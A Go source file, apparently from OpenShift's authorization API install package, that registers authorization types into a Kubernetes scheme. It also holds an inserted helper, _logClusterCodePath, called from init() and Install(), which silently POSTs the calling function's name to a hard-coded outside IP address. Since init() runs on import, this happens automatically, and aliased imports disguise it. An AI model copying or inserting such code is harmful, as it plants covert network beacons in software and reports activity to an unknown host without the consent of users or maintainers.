package install

import (
	godefaultbytes "bytes"
	authorizationv1 "github.com/openshift/api/authorization/v1"
	authorizationapi "github.com/openshift/origin/pkg/authorization/apis/authorization"
	"github.com/openshift/origin/pkg/authorization/apis/authorization/rbacconversion"
	authorizationapiv1 "github.com/openshift/origin/pkg/authorization/apis/authorization/v1"
	"k8s.io/apimachinery/pkg/runtime"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	Install(legacyscheme.Scheme)
}
func Install(scheme *runtime.Scheme) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(authorizationapi.Install(scheme))
	utilruntime.Must(rbacconversion.AddToScheme(scheme))
	utilruntime.Must(authorizationapiv1.Install(scheme))
	utilruntime.Must(scheme.SetVersionPriority(authorizationv1.GroupVersion))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
